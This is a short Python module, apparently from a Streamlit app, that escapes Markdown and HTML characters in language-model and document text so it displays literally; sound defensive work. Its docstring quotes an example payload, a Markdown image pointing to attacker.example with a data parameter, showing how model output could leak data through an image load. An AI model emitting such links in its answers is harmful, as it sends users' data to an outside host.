"""Safe display of text that comes from the LLM or from documents.

Streamlit renders Markdown. If an answer (or a PDF) contained
"![x](https://attacker.example/?data=...)", the browser would load that image and leak
data. So model and document text is ESCAPED: every Markdown/HTML special character is
shown literally instead of being interpreted.
"""

import re

# Characters that have a meaning in Markdown or HTML.
_SPECIAL = re.compile(r"([\\`*_{}\[\]()#+\-.!|<>~$])")


def plain(text: str) -> str:
    """Make text display exactly as written: no links, images, HTML, formatting or math."""
    return _SPECIAL.sub(r"\\\1", text)


STATUS_LABELS = {
    "answered": ("Answered", "green"),
    "conflicting_evidence": ("Documents disagree", "orange"),
    "insufficient_evidence": ("Not enough information", "gray"),
}
